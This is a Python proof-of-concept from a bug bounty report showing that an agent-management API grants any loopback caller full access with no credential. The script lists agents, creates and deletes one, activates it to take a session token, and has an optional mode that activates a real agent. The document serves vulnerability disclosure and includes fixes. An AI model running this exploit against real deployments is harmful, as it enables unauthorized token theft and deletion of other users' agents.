#!/usr/bin/env python3
"""
BUG 7 — Full Agent CRUD from Loopback with Zero Credentials
============================================================
Severity: MEDIUM-HIGH
Status: CONFIRMED LIVE (tested 2026-10-11)

Attack summary
--------------
All agent management endpoints accept requests from the loopback interface
with NO credential.  Any process on the same machine can silently enumerate
agents, destroy them, or steal a fresh session token without knowing the
Moorcheh API key.

    GET    /api/v2/agents               → 200  (lists all agents)
    POST   /api/v2/agents               → 201  (creates an agent)
    DELETE /api/v2/agents/{id}          → 200  (deletes an agent)
    POST   /api/v2/agents/{id}/activate → 200  (gets a session token)

Root cause
----------
require_management_access() in auth_deps.py grants loopback TCP peers full
access without checking the presented credential at all:

    if (is_loopback_host(client_host)
            and _is_loopback_host_header(...)
            and not _is_cross_site_browser_request(...)
            and not _has_forwarded_non_loopback(...)):
        return server_key        # credential never verified

Impact
------
  1. Enumerate all agent IDs with a single HTTP call.
  2. Delete every agent silently with no API key.
  3. Activate any agent and receive a valid session token for full
     memory read/write.
  4. Create agents that pollute the namespace and inflate Moorcheh usage.

This is "Authentication & Authorization Bypass" in the bounty threat model
(issue #1852).  Exploitability is limited to local code execution, which is
exactly the threat model for malicious supply-chain packages.

Fix
---
  Option A: require a valid credential even on loopback — remove the
    unconditional loopback short-circuit from require_management_access().

  Option B (design-preserving): keep the loopback convenience for read
    endpoints (GET /agents, GET /status) but require a real key for all
    state-changing operations (create, delete, activate, deactivate).

Prerequisites
-------------
  pip install requests

Usage
-----
  python bug7_zero_credential_crud.py --host http://127.0.0.1:8765
  python bug7_zero_credential_crud.py --host http://127.0.0.1:8765 --destructive
"""

import argparse
import sys
import uuid

import requests


def step(n, msg):  print(f"\n[Step {n}] {msg}")
def ok(msg):       print(f"  \033[92m[PASS]\033[0m  {msg}")
def fail(msg):     print(f"  \033[91m[VULN]\033[0m  {msg}")
def info(msg):     print(f"  \033[94m[INFO]\033[0m  {msg}")
def warn(msg):     print(f"  \033[93m[WARN]\033[0m  {msg}")


def run(host: str, destructive: bool) -> None:
    api = f"{host}/api/v2"

    print("=" * 65)
    print("BUG 7 — Full Agent CRUD with Zero Credentials (Loopback)")
    print("=" * 65)
    print(f"  Host: {host}")
    print(f"  Mode: {'DESTRUCTIVE' if destructive else 'non-destructive (throwaway agent)'}")

    # Step 1: List all agents — no credential
    step(1, "GET /api/v2/agents — no credential")
    r = requests.get(f"{api}/agents", timeout=5)
    if r.status_code == 200:
        agents = r.json().get("agents", [])
        fail(f"Listed {len(agents)} agent(s) with zero credentials")
        for a in agents[:3]:
            info(f"  {a['agent_id']}")
        if len(agents) > 3:
            info(f"  ... and {len(agents) - 3} more")
    elif r.status_code in (401, 403):
        ok(f"Listing requires credential: HTTP {r.status_code}")
        sys.exit(0)
    else:
        info(f"HTTP {r.status_code}: {r.text[:80]}")
        sys.exit(1)

    # Step 2: Create a throwaway agent — no credential
    throwaway_id = f"audit-throwaway-{uuid.uuid4().hex[:8]}"
    step(2, f"POST /api/v2/agents — create {throwaway_id!r} with zero credentials")
    r = requests.post(
        f"{api}/agents",
        json={"agent_id": throwaway_id, "pattern": "tool"},
        timeout=10,
    )
    if r.status_code == 201:
        fail(f"Agent {throwaway_id!r} created — no key supplied")
    elif r.status_code in (401, 403):
        ok(f"Create requires credential: HTTP {r.status_code}")
    else:
        info(f"HTTP {r.status_code}: {r.text[:80]}")

    # Step 3: Activate the throwaway agent — no credential
    step(3, f"POST /api/v2/agents/{throwaway_id}/activate — no credential")
    r = requests.post(f"{api}/agents/{throwaway_id}/activate", timeout=10)
    stolen_token = None
    if r.status_code == 200:
        stolen_token = r.json().get("session_token", "")
        fail(f"Activation succeeded, session token obtained")
        info(f"  token[:40]: {stolen_token[:40]}...")

        r2 = requests.post(
            f"{api}/agents/{throwaway_id}/recall",
            json={"query": "test", "limit": 1},
            headers={"X-Session-Token": stolen_token},
            timeout=5,
        )
        if r2.status_code == 200:
            fail("Stolen token accepted for memory recall — full access confirmed")
        else:
            info(f"Recall with stolen token: HTTP {r2.status_code}")
    elif r.status_code in (401, 403):
        ok(f"Activation requires credential: HTTP {r.status_code}")
    else:
        info(f"HTTP {r.status_code}: {r.text[:80]}")

    # Step 4: Delete the throwaway agent — no credential
    step(4, f"DELETE /api/v2/agents/{throwaway_id} — no credential")
    if stolen_token:
        requests.post(
            f"{api}/agents/{throwaway_id}/deactivate",
            headers={"X-Session-Token": stolen_token},
            timeout=5,
        )
    r = requests.delete(f"{api}/agents/{throwaway_id}", timeout=5)
    if r.status_code == 200:
        fail(f"Agent deleted with zero credentials — {r.json().get('message','')}")
    elif r.status_code in (401, 403):
        ok(f"Delete requires credential: HTTP {r.status_code}")
    elif r.status_code == 404:
        info("Agent already gone")
    else:
        info(f"HTTP {r.status_code}: {r.text[:80]}")

    # Step 5 (optional): target a real agent
    if destructive and agents:
        real_target = agents[0]["agent_id"]
        step(5, f"[DESTRUCTIVE] Activate real agent {real_target!r} — no credential")
        warn("This activates a live agent without its owner's key.")
        r = requests.post(f"{api}/agents/{real_target}/activate", timeout=10)
        if r.status_code == 200:
            tok = r.json()["session_token"]
            fail(f"Real agent activated — token: {tok[:40]}...")
            requests.post(
                f"{api}/agents/{real_target}/deactivate",
                headers={"X-Session-Token": tok},
                timeout=5,
            )
            info("Session cleaned up")
        elif r.status_code == 409:
            info("Agent already has an active session (409)")
        else:
            info(f"HTTP {r.status_code}")

    print("\n" + "=" * 65)
    print("BUG 7 — SUMMARY")
    print("=" * 65)
    print("""
  Root cause:  require_management_access() grants any loopback TCP peer
               full management access without verifying credentials.

  Attack:      Any local process can enumerate, create, destroy, and
               activate agents — and obtain valid session tokens —
               without knowing the Moorcheh API key.

  Impact:
    1. Enumerate all agent IDs            (no key)
    2. Create agents                      (no key)
    3. Delete any agent                   (no key)
    4. Activate any agent + get a token   (no key → full memory R/W)

  Fix:
    Require a real credential for state-changing operations even on
    loopback, or remove the unconditional loopback bypass entirely.
""")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Bug 7 PoC — zero-credential agent CRUD")
    p.add_argument("--host", default="http://127.0.0.1:8765")
    p.add_argument(
        "--destructive",
        action="store_true",
        help="Also activate a real (non-throwaway) agent to show full impact",
    )
    args = p.parse_args()
    run(args.host, args.destructive)
